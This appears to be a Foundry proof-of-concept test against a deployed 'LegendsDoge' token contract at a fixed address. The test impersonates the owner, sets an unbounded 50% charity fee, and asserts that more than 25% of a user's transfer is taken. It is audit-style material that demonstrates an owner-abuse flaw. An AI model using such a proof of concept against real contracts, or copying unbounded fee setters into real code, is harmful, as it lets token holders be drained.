```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILegendsDoge {
    function owner() external view returns (address);
    function FeeAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function updateFee(uint256 _txFee, uint256 _burnFee, uint256 _charityFee) external;
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    ILegendsDoge public token;
    address public owner;
    address public feeAddress;
    address public alice = address(0x1111);
    address public bob = address(0x2222);

    function setUp() public {
        token = ILegendsDoge(0xCd092F1f9858204d7986b3a2e36730fF1229a2e5);
        owner = token.owner();
        feeAddress = token.FeeAddress();

        // Label addresses for readability
        vm.label(address(token), "LegendsDoge");
        vm.label(owner, "Owner");
        vm.label(feeAddress, "FeeAddress");
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");

        // Ensure owner has tokens to transfer to alice
        uint256 ownerBalance = token.balanceOf(owner);
        require(ownerBalance > 0, "Owner has no tokens");

        // Transfer some tokens to alice from owner
        vm.prank(owner);
        token.transfer(alice, 1000 * 10**token.decimals());
    }

    function test_exceedLimitFees() public {
        // 1. Record balances before fee update and transfer
        uint256 aliceBefore = token.balanceOf(alice);
        uint256 feeAddressBefore = token.balanceOf(feeAddress);

        // 2. Owner sets charity fee to 50% (unreasonable >25%)
        vm.prank(owner);
        token.updateFee(0, 0, 50); // _charityFee = 50 => 50% charity fee

        // 3. Alice transfers to Bob, observe fee
        uint256 transferAmount = 100 * 10**token.decimals(); // ensure <= maxTxAmount
        uint256 maxTx = token._maxTxAmount();
        require(transferAmount <= maxTx, "Transfer exceeds maxTxAmount");
        vm.prank(alice);
        token.transfer(bob, transferAmount);

        // 4. Check balances after transfer
        uint256 aliceAfter = token.balanceOf(alice);
        uint256 bobAfter = token.balanceOf(bob);
        uint256 feeAddressAfter = token.balanceOf(feeAddress);

        // Compute charity fee received by FeeAddress (only charity fee, no tax/burn)
        uint256 charityFee = feeAddressAfter - feeAddressBefore;

        // 5. Assert that charityFee is more than 25% of transferAmount
        // Expected charity fee = transferAmount * 50 / 100 = transferAmount / 2
        assertGt(charityFee, (transferAmount * 25) / 100, "Charity fee is not more than 25%");
        // Also verify that the charity fee is exactly half (within rounding)
        assertApproxEqAbs(charityFee, transferAmount / 2, 1, "Charity fee not ~50%");

        // Additionally, Alice lost exactly transferAmount tokens
        assertEq(aliceBefore - aliceAfter, transferAmount, "Alice did not lose transferAmount");
        // Bob received transferAmount - charityFee (since only charity fee is taken)
        assertEq(bobAfter, transferAmount - charityFee, "Bob received wrong amount");

        emit log("Success: Owner set 50% charity fee, >25% threshold");
        emit log_named_uint("Charity fee amount", charityFee);
        emit log_named_uint("Transfer amount", transferAmount);
        emit log_named_uint("Fee percentage", (charityFee * 100) / transferAmount);
    }
}
```
